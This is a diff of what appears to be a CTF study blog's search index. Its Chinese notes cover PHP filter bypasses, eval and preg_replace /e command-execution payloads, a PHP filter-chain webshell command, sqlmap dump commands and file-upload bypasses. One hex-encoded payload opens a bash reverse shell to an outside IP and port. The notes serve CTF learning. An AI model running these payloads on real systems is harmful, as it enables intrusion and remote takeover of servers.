@@ -50,22 +50,6 @@
       </tags>
   </entry>
   <entry>
-    <title>eregi</title>
-    <url>/2024/07/17/eregi/</url>
-    <content><![CDATA[<p>&emsp;&emsp;eregi()函数用指定的模式搜索一个字符串中指定的字符串,布尔类型，如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。有两个参数，eregi($pattern,$string),在$string里面搜索$pattern。</p>
-<h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p>&emsp;&emsp;ereg函数存在NULL截断漏洞，即%00截断，可以使用%00绕过验证，例如</p>
-<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line"><span class="meta"><span class="keyword">$a</span> = %00hello</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="数组返回值"><a href="#数组返回值" class="headerlink" title="数组返回值"></a>数组返回值</h3><p>&emsp;&emsp;与其他不同的是，该函数若参数为数组是它的返回值不是FALSE，也不会报错。</p>
-]]></content>
-      <categories>
-        <category>PHP</category>
-      </categories>
-      <tags>
-        <tag>绕过</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>fenjing</title>
     <url>/2024/06/05/fenjing/</url>
     <content><![CDATA[<h2 id="Fenjing-焚靖"><a href="#Fenjing-焚靖" class="headerlink" title="Fenjing(焚靖)"></a>Fenjing(焚靖)</h2><h3 id="fenjing介绍"><a href="#fenjing介绍" class="headerlink" title="fenjing介绍"></a>fenjing介绍</h3><p>&emsp;&emsp;焚靖是一个针对CTF比赛中Jinja2 SSTI绕过WAF的全自动脚本，可以自动攻击给定的网站或接口。能解决常规性的SSTI题目，实用指数⭐⭐⭐</p>
@@ -104,12 +88,13 @@
       </tags>
   </entry>
   <entry>
-    <title>in_array</title>
-    <url>/2024/07/13/in-array/</url>
-    <content><![CDATA[<p>&emsp;&emsp;in_array函数的功能用于检查数组是否存在某个值或者是不是数组。定义：布尔型函数，参数为（$needle,$haystack,[$strict &#x3D; FALSE]）,在$haystack中搜索$needle,如果第三个参数$strict的值为TRUE(没有默认为FALSE),则该函数会进行强检查（相等于&#x3D;&#x3D;&#x3D;），检查$needle的类型是否和$haystack中的相同。<font color=red>如果找到$haystack，则返回TRUE,否则返回FALSE。</font></p>
-<h3 id="in-array缺陷"><a href="#in-array缺陷" class="headerlink" title="in_array缺陷"></a>in_array缺陷</h3><p>&emsp;&emsp;根据上面所描述的，当该函数没有设置第三个参数的时候，只会进行弱类型比较（相当于&#x3D;&#x3D;），也就是不会检查数据类型，例如<br><img data-src="/images/in_array()%E5%87%BD%E6%95%B0%E7%BC%BA%E9%99%B7.png" alt="in_array"><br>&emsp;&emsp;根据上面白名单规定，只能上传1~24的文件名，因为没有第三个参数，进行弱比较，所以我们上传3shell.php的时候，只要第一个匹配就可以了，从而绕过了白名单，达到了任意文件上传的目的。类似的还有：  </p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="number">3</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span>;</span><br><span class="line"><span class="variable">$whitelist</span> = <span class="title function_ invoke__">range</span>(<span class="number">1</span>,<span class="number">5</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$id</span>,<span class="variable">$whitelist</span>))</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">     <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;这里我们有没有设置第三个参数，进行弱类型比较，同样绕过了白名单，这里需要注意的是in_array的返回类型，匹配了返回什么，还有注意前面的！，在preg_match等匹配的时候有常出现，要知道它的作用。</p>
+    <title>eregi</title>
+    <url>/2024/07/17/eregi/</url>
+    <content><![CDATA[<p>&emsp;&emsp;eregi()函数用指定的模式搜索一个字符串中指定的字符串,布尔类型，如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。有两个参数，eregi($pattern,$string),在$string里面搜索$pattern。</p>
+<h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p>&emsp;&emsp;ereg函数存在NULL截断漏洞，即%00截断，可以使用%00绕过验证，例如</p>
+<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line"><span class="meta"><span class="keyword">$a</span> = %00hello</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="数组返回值"><a href="#数组返回值" class="headerlink" title="数组返回值"></a>数组返回值</h3><p>&emsp;&emsp;与其他不同的是，该函数若参数为数组是它的返回值不是FALSE，也不会报错。</p>
 ]]></content>
       <categories>
         <category>PHP</category>
@@ -119,16 +104,12 @@
       </tags>
   </entry>
   <entry>
-    <title>is_numberic</title>
-    <url>/2024/07/13/is-numberic/</url>
-    <content><![CDATA[<p>&emsp;&emsp;is_numeric()函数用于检查变量是否为数字或数字字符串。属于布尔类型，如果指定的变量是数字和数字字符串则返回TRUE，否则返回FALSE，注意<font color=red>浮点型返回空值，即FALSE。</font></p>
-<h3 id="空字符绕过"><a href="#空字符绕过" class="headerlink" title="空字符绕过"></a>空字符绕过</h3><p>&emsp;&emsp;可以借助URL编码中的空字符，例如%00或者%20，其中%00加在前面或者后面都可以，也就是%00404或者404%00，而%20只能放在末尾，比如404%20（%20准确来说是空格字符）  </p>
-<figure class="highlight erlang-repl"><table><tr><td class="code"><pre><span class="line">数字--&gt;非数字：</span><br><span class="line">数值<span class="comment">%20</span></span><br><span class="line"><span class="comment">%00数值</span></span><br><span class="line">数值<span class="comment">%00</span></span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;当然还可以这样构造:</p>
-<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">num</span>=1&#x27;</span><br><span class="line">?<span class="attribute">num</span>=1,</span><br><span class="line">?<span class="attribute">num</span>=1%00</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;都可以绕过判断</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!is_numeric(<span class="variable">$num</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$num</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==1)</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp; 其实题目的核心是弱比较的特性，我们只要知道这个函数的返回类型和作用就过关了(っ◞‸◟c)</p>
+    <title>in_array</title>
+    <url>/2024/07/13/in-array/</url>
+    <content><![CDATA[<p>&emsp;&emsp;in_array函数的功能用于检查数组是否存在某个值或者是不是数组。定义：布尔型函数，参数为（$needle,$haystack,[$strict &#x3D; FALSE]）,在$haystack中搜索$needle,如果第三个参数$strict的值为TRUE(没有默认为FALSE),则该函数会进行强检查（相等于&#x3D;&#x3D;&#x3D;），检查$needle的类型是否和$haystack中的相同。<font color=red>如果找到$haystack，则返回TRUE,否则返回FALSE。</font></p>
+<h3 id="in-array缺陷"><a href="#in-array缺陷" class="headerlink" title="in_array缺陷"></a>in_array缺陷</h3><p>&emsp;&emsp;根据上面所描述的，当该函数没有设置第三个参数的时候，只会进行弱类型比较（相当于&#x3D;&#x3D;），也就是不会检查数据类型，例如<br><img data-src="/images/in_array()%E5%87%BD%E6%95%B0%E7%BC%BA%E9%99%B7.png" alt="in_array"><br>&emsp;&emsp;根据上面白名单规定，只能上传1~24的文件名，因为没有第三个参数，进行弱比较，所以我们上传3shell.php的时候，只要第一个匹配就可以了，从而绕过了白名单，达到了任意文件上传的目的。类似的还有：  </p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="number">3</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span>;</span><br><span class="line"><span class="variable">$whitelist</span> = <span class="title function_ invoke__">range</span>(<span class="number">1</span>,<span class="number">5</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$id</span>,<span class="variable">$whitelist</span>))</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">     <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;这里我们有没有设置第三个参数，进行弱类型比较，同样绕过了白名单，这里需要注意的是in_array的返回类型，匹配了返回什么，还有注意前面的！，在preg_match等匹配的时候有常出现，要知道它的作用。</p>
 ]]></content>
       <categories>
         <category>PHP</category>
@@ -148,6 +129,25 @@
 
 <h3 id="字符串绕过"><a href="#字符串绕过" class="headerlink" title="字符串绕过"></a>字符串绕过</h3><p>&emsp;&emsp;类似于’1000’,’2 or id &#x3D; 1000’的这种带单引号或者有字符的类型，intval()函数会从字符串的开始进行转换，直到遇到非数字的字符，例如第二个转换到or的时候，由于or不是数字类型的字符，从而停止转换，转换的结果就只有2。  </p>
 <h3 id="字符串类型-进制绕过"><a href="#字符串类型-进制绕过" class="headerlink" title="字符串类型&amp;进制绕过"></a>字符串类型&amp;进制绕过</h3><p><img data-src="/images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%B1%BB%E5%9E%8B&%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87.png" alt="字符串类型&amp;进制绕过"></p>
+]]></content>
+      <categories>
+        <category>PHP</category>
+      </categories>
+      <tags>
+        <tag>绕过</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>is_numberic</title>
+    <url>/2024/07/13/is-numberic/</url>
+    <content><![CDATA[<p>&emsp;&emsp;is_numeric()函数用于检查变量是否为数字或数字字符串。属于布尔类型，如果指定的变量是数字和数字字符串则返回TRUE，否则返回FALSE，注意<font color=red>浮点型返回空值，即FALSE。</font></p>
+<h3 id="空字符绕过"><a href="#空字符绕过" class="headerlink" title="空字符绕过"></a>空字符绕过</h3><p>&emsp;&emsp;可以借助URL编码中的空字符，例如%00或者%20，其中%00加在前面或者后面都可以，也就是%00404或者404%00，而%20只能放在末尾，比如404%20（%20准确来说是空格字符）  </p>
+<figure class="highlight erlang-repl"><table><tr><td class="code"><pre><span class="line">数字--&gt;非数字：</span><br><span class="line">数值<span class="comment">%20</span></span><br><span class="line"><span class="comment">%00数值</span></span><br><span class="line">数值<span class="comment">%00</span></span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;当然还可以这样构造:</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">num</span>=1&#x27;</span><br><span class="line">?<span class="attribute">num</span>=1,</span><br><span class="line">?<span class="attribute">num</span>=1%00</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;都可以绕过判断</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!is_numeric(<span class="variable">$num</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$num</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==1)</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp; 其实题目的核心是弱比较的特性，我们只要知道这个函数的返回类型和作用就过关了(っ◞‸◟c)</p>
 ]]></content>
       <categories>
         <category>PHP</category>
@@ -198,20 +198,6 @@
       </tags>
   </entry>
   <entry>
-    <title>php_filter_chain_generator</title>
-    <url>/2024/07/14/php-filter-chain-generator/</url>
-    <content><![CDATA[<p>&emsp;&emsp;文件包含漏洞利用流在其中写入一句话木马，实用指数:⭐⭐⭐脚本下载<a href="https://github.com/synacktiv/php_filter_chain_generator">here</a><br>&emsp;&emsp;常用的命令（当然也可以看那里的）  </p>
-<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">python3 php_filter_chain_generator<span class="selector-class">.py</span> <span class="attr">--chain</span> <span class="string">&#x27;一句话木马&#x27;</span></span><br></pre></td></tr></table></figure>
-<p> <img data-src="/images/php_filter.png" alt="php_filter"><br>&emsp;&emsp;将回显的链子复制给网页,然后用hackbar或者蚁剑连接即可。<br><img data-src="/images/php_filter2.png" alt="php_filter2"></p>
-]]></content>
-      <categories>
-        <category>PHP</category>
-      </categories>
-      <tags>
-        <tag>工具|脚本 利用</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>php入门</title>
     <url>/2024/07/14/php%E5%85%A5%E9%97%A8/</url>
     <content><![CDATA[<p>&emsp;&emsp;对于刚接触web题的时候，最先掌握的语言应该是php，不说所有知识点要了解，起码打web题的时候GET和POST方法要会辨别和使用，推荐PHP学习网站  <a href="https://www.runoob.com/php">https://www.runoob.com/php</a><br>&emsp;&emsp;生怕你们不会点，超链接都没有弄(っ’-‘)╮&#x3D;͟͟͞͞🎁) ﾟдﾟ ）</p>
@@ -226,6 +212,40 @@
       </categories>
       <tags>
         <tag>基础</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php_filter_chain_generator</title>
+    <url>/2024/07/14/php-filter-chain-generator/</url>
+    <content><![CDATA[<p>&emsp;&emsp;文件包含漏洞利用流在其中写入一句话木马，实用指数:⭐⭐⭐脚本下载<a href="https://github.com/synacktiv/php_filter_chain_generator">here</a><br>&emsp;&emsp;常用的命令（当然也可以看那里的）  </p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">python3 php_filter_chain_generator<span class="selector-class">.py</span> <span class="attr">--chain</span> <span class="string">&#x27;一句话木马&#x27;</span></span><br></pre></td></tr></table></figure>
+<p> <img data-src="/images/php_filter.png" alt="php_filter"><br>&emsp;&emsp;将回显的链子复制给网页,然后用hackbar或者蚁剑连接即可。<br><img data-src="/images/php_filter2.png" alt="php_filter2"></p>
+]]></content>
+      <categories>
+        <category>PHP</category>
+      </categories>
+      <tags>
+        <tag>工具|脚本 利用</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>preg_replace</title>
+    <url>/2024/07/12/preg-replace/</url>
+    <content><![CDATA[<p>&emsp;&emsp;preg_replace 函数执行一个正则表达式的搜索和替换。相比于preg_match 函数它多了一个替换的功能（没错，说了一句废话）<br>&emsp;&emsp;通常来说，它有三个参数，preg_repalce($pattern,$repalcement,$subject);–&gt;搜索$subject中匹配$pattern的部分，并以$replacement进行替换。话不多说，看题目就懂了。<br>注：str_replace也是一样的特性，区别是正则的规则匹配</p>
+<h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;str&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/HYNUCTF/&#x27;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$str</span> === <span class="string">&quot;HYNUCTF&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;菜，就多练&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;既然HYNUCTF组合会变为空那么可以通过双写拼接进行绕过，原理跟sql注入的关键字绕过差不多。<br>payload：HYNU<font color=red>HYNUCTF</font>CTF<br>&emsp;&emsp;红色部分被替换成了空，那么剩下的就拼接成了是吧。</p>
+<h3 id="eval创建新变量绕过"><a href="#eval创建新变量绕过" class="headerlink" title="eval创建新变量绕过"></a>eval创建新变量绕过</h3><p>&emsp;&emsp;这是个很有用的地方，很多题型都适用这个，当遇到过滤了关键字符或者没有头绪的时候，可以使用这个方法进行创建一个新变量去执行它。<br>&emsp;&emsp;例如</p>
+<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">$str = preg_replace(<span class="string">&#x27;/system/&#x27;</span>,<span class="string">&quot;&quot;</span>,$_GET[<span class="string">&#x27;str&#x27;</span>]);</span><br><span class="line">······</span><br><span class="line">payload：  </span><br><span class="line">?str=<span class="keyword">eval</span>($_GET[<span class="string">&#x27;A&#x27;</span>]);&amp;A=<span class="keyword">system</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;这是利用eval执行system命令去寻找拥有flag的页面，后续同理我们可以使用GET和POST方法来进行绕过。</p>
+<h3 id="经典漏洞-e"><a href="#经典漏洞-e" class="headerlink" title="经典漏洞&#x2F;e"></a>经典漏洞&#x2F;e</h3><p>&emsp;&emsp;preg_replace函数的特性，&#x2F;e可执行模式，此为PHP专有参数，例如preg_replace函数。也就是说，它的$repalcement部分会被当做命令执行。  </p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/HYNUCTF/e&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>],<span class="string">&quot;XTWASYS&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;此时传入?str&#x3D;system(“ls”);就可执行此代码。</p>
+]]></content>
+      <categories>
+        <category>PHP</category>
+      </categories>
+      <tags>
+        <tag>绕过</tag>
       </tags>
   </entry>
   <entry>
@@ -262,26 +282,6 @@
 <h3 id="进制绕过"><a href="#进制绕过" class="headerlink" title="进制绕过"></a>进制绕过</h3><p>&emsp;&emsp;通过进制绕过是通用的，我们可以将指令转成十六进制，然后用php -r进行php代码执行。<br><img data-src="/images/ciscn.png" alt="ciscn"><br>&emsp;&emsp;payload</p>
 <figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">cmd</span>=php -r <span class="variable">$a</span>=substr(Z62617368202d63202262617368202d69203e26202f6465762f7463702f3132342e3232322e3133362e33332f3133333720303e263122,<span class="number">1</span>)<span class="comment">;system(hex2bin($a));</span></span><br></pre></td></tr></table></figure>
 <p>&emsp;&emsp;这段十六进制是命令<font color=blue>bash -c “bash -i&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;124.222.136.33&#x2F;1337 0&gt;&amp;1”</font>这条命令的意思是向124.222.136.33(服务器的IP)的1337端口建立一个连接，输入(0)的内容变为命令输出(1)。之所以前面有z不属于16进制的字符存在时因为加不了引号，开头是数字的话，就会将类型识别为数字，若后续出现了字符串就会报错，所以我们要用substr将类型转为字符串。</p>
-]]></content>
-      <categories>
-        <category>PHP</category>
-      </categories>
-      <tags>
-        <tag>绕过</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>preg_replace</title>
-    <url>/2024/07/12/preg-replace/</url>
-    <content><![CDATA[<p>&emsp;&emsp;preg_replace 函数执行一个正则表达式的搜索和替换。相比于preg_match 函数它多了一个替换的功能（没错，说了一句废话）<br>&emsp;&emsp;通常来说，它有三个参数，preg_repalce($pattern,$repalcement,$subject);–&gt;搜索$subject中匹配$pattern的部分，并以$replacement进行替换。话不多说，看题目就懂了。<br>注：str_replace也是一样的特性，区别是正则的规则匹配</p>
-<h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;str&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/HYNUCTF/&#x27;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$str</span> === <span class="string">&quot;HYNUCTF&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;菜，就多练&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;既然HYNUCTF组合会变为空那么可以通过双写拼接进行绕过，原理跟sql注入的关键字绕过差不多。<br>payload：HYNU<font color=red>HYNUCTF</font>CTF<br>&emsp;&emsp;红色部分被替换成了空，那么剩下的就拼接成了是吧。</p>
-<h3 id="eval创建新变量绕过"><a href="#eval创建新变量绕过" class="headerlink" title="eval创建新变量绕过"></a>eval创建新变量绕过</h3><p>&emsp;&emsp;这是个很有用的地方，很多题型都适用这个，当遇到过滤了关键字符或者没有头绪的时候，可以使用这个方法进行创建一个新变量去执行它。<br>&emsp;&emsp;例如</p>
-<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">$str = preg_replace(<span class="string">&#x27;/system/&#x27;</span>,<span class="string">&quot;&quot;</span>,$_GET[<span class="string">&#x27;str&#x27;</span>]);</span><br><span class="line">······</span><br><span class="line">payload：  </span><br><span class="line">?str=<span class="keyword">eval</span>($_GET[<span class="string">&#x27;A&#x27;</span>]);&amp;A=<span class="keyword">system</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;这是利用eval执行system命令去寻找拥有flag的页面，后续同理我们可以使用GET和POST方法来进行绕过。</p>
-<h3 id="经典漏洞-e"><a href="#经典漏洞-e" class="headerlink" title="经典漏洞&#x2F;e"></a>经典漏洞&#x2F;e</h3><p>&emsp;&emsp;preg_replace函数的特性，&#x2F;e可执行模式，此为PHP专有参数，例如preg_replace函数。也就是说，它的$repalcement部分会被当做命令执行。  </p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/HYNUCTF/e&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>],<span class="string">&quot;XTWASYS&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;此时传入?str&#x3D;system(“ls”);就可执行此代码。</p>
 ]]></content>
       <categories>
         <category>PHP</category>
@@ -378,15 +378,16 @@
       </tags>
   </entry>
   <entry>
-    <title>信息收集（CTF基础篇）</title>
-    <url>/2024/07/18/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88CTF%E5%9F%BA%E7%A1%80%E7%AF%87%EF%BC%89/</url>
-    <content><![CDATA[<p>&emsp;&emsp;信息收集作为CTF最常用的手段（直接给源码的不算），常规思路有<br><font color=black><br>ctrl+U 查看源代码<br>F12  查看js脚本<br>robots.txt 文件泄露,在URL后面加上&#x2F;robots.txt,可能会给出flag或所在路径<br><a href="http://www.zip/">www.zip</a>   压缩包，同上用法<br>dirsearch   扫描文件，转至<a href="/2024/07/23/dirsearch/">dirsearch</a><br>BurpSuite  抓包找响应头，转至<a href="/2024/07/25/BurpSuite/">BurpSuite</a><br></font><br>&emsp;&emsp;基本思路就这些，剩下的就靠你的搜索能力了( ੭ ˙ᗜ˙ )੭</p>
-]]></content>
+    <title>sqlmap</title>
+    <url>/2024/08/03/sqlmap/</url>
+    <content><![CDATA[<p>&emsp;&emsp;sqlmap是kali自带的一种工具，通常对网站进行sql注入，首先就要做的是找到注入点，找到后就可以使用sqlmap一把梭了。同时它也具备了一些脚本去使用，也可以搭配自定义脚本，理论上sql题目可以通杀的，看你的掌握度如何。常规指令有如下，实用指数:⭐⭐⭐⭐<br><img data-src="/images/sqlmap.png" alt="sqlmap"><br>&emsp;&emsp;经典一把梭</p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">sqlmap -u URL <span class="attr">--dbs</span> <span class="attr">--tables</span> <span class="built_in">-batch</span>(爆库)</span><br><span class="line">sqlmap -u URL <span class="attr">--dbs</span> <span class="attr">--tables</span> -batch -D <span class="string">&#x27;    &#x27;</span>(爆表)</span><br><span class="line">sqlmap -u URL <span class="attr">--dbs</span> <span class="attr">--tables</span> -batch</span><br><span class="line">-D <span class="string">&#x27;   &#x27;</span>  -T  <span class="string">&#x27;   &#x27;</span>(爆列)</span><br><span class="line">sqlmap -u URL <span class="attr">--dbs</span> <span class="attr">--tables</span> -batch</span><br><span class="line">-D <span class="string">&#x27;   &#x27;</span>  -T  <span class="string">&#x27;   &#x27;</span>  <span class="attr">--dump</span>(爆段)</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>WEB</category>
       </categories>
       <tags>
-        <tag>基础</tag>
+        <tag>工具|脚本 利用</tag>
+        <tag>sql注入</tag>
       </tags>
   </entry>
   <entry>
@@ -415,44 +416,15 @@
       </tags>
   </entry>
   <entry>
-    <title>文件上传</title>
-    <url>/2024/07/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
-    <content><![CDATA[<p>&emsp;&emsp;文件上传是利用服务端所提供给你的权力，本意是让你们上传一些有意义的东西，但一些人就从中发现了一些可以利用的漏洞，上传一句话木马进去，这就是典型的文件上传漏洞，靠我们去猜过滤，从而绕过它。那么有以下几种方式的过滤和绕过方法。</p>
-<h3 id="前端检测"><a href="#前端检测" class="headerlink" title="前端检测"></a>前端检测</h3><p>&emsp;&emsp;对于前端的概念就是我们能看到的源码的那种，我们可以打开F12或者ctrl+U找js代码，原理就是前端是客户端还没有向服务器发送任何消息时对<font color=red>本地</font>进行检测来判断是否满足上传的类型。<br>&emsp;&emsp;绕过方法</p>
-<ul>
-<li>删除或者禁用js(JavaScript) 各个浏览器有不同的方式</li>
-<li>使用代理上传文件，用BP抓包修改成符合要求的文件类型，使用方法转至<a href="/2024/07/25/BurpSuite/">BurpSuite</a></li>
-</ul>
-<h3 id="后端检测"><a href="#后端检测" class="headerlink" title="后端检测"></a>后端检测</h3><p>&emsp;&emsp;这种的就不能靠抓包提前去改了，主要是通过黑白名单进行过滤检测。</p>
-<h4 id="白名单绕过"><a href="#白名单绕过" class="headerlink" title="白名单绕过"></a>白名单绕过</h4><h5 id="解析漏洞（黑名单通用）"><a href="#解析漏洞（黑名单通用）" class="headerlink" title="解析漏洞（黑名单通用）"></a>解析漏洞（黑名单通用）</h5><figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">.htaccess文件解析漏洞   <span class="comment">//重点常考点（有没有老师划重点的那味了- ̗̀(๑ᵔ⌔ᵔ๑)）</span></span><br><span class="line">apache解析漏洞</span><br><span class="line">IIS7.<span class="number">0</span> <span class="string">| IIS7.5 | Nginx的解析漏洞</span></span><br><span class="line">IIS6.<span class="number">0</span>解析漏洞</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;关于这些解析漏洞我就不细讲了，对照相应的搜索一下就可以了，这些漏洞后续也会在对应板块出现。</p>
-<h5 id="截断上传（黑名单通用）"><a href="#截断上传（黑名单通用）" class="headerlink" title="截断上传（黑名单通用）"></a>截断上传（黑名单通用）</h5><ul>
-<li>截断类型:PHP%00截断 (扩展想想还有哪个函数也是这样的)，例如1.php%00</li>
-<li>截断原理:由于00代表结束符,所以会把00后面的所有字符都截断,同理，黑名单也可以用，不过我用得少</li>
-<li>截断条件:PHP版本小于5.3.4,PHP的magic_quotes_gpc为OFF状态</li>
-</ul>
-<h4 id="改后缀"><a href="#改后缀" class="headerlink" title="改后缀"></a>改后缀</h4><p>&emsp;&emsp;将php木马改成满足条件的后缀即可，例如<font color=red>1.php &#x3D;&gt; 1.jpg</font></p>
-<h4 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h4><h5 id="特殊的扩展名"><a href="#特殊的扩展名" class="headerlink" title="特殊的扩展名"></a>特殊的扩展名</h5><p>&emsp;&emsp;如果是黑名单的就可以钻空子，看有没有漏网之鱼，例如</p>
-<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">比如:</span></span><br><span class="line">asa和cer之类</span><br><span class="line"><span class="section">asp: asa cer aspx</span></span><br><span class="line"><span class="section">jsp: jspx jspf</span></span><br><span class="line"><span class="section">php: php php3 php4 php5 phtml pht (划重点)</span></span><br><span class="line"><span class="section">exe: exee</span></span><br></pre></td></tr></table></figure>
-
-<h5 id="利用windows的命名机制"><a href="#利用windows的命名机制" class="headerlink" title="利用windows的命名机制"></a>利用windows的命名机制</h5><p>&emsp;&emsp;在windows中，后缀名后面的点和空格都会被删除掉。例如</p>
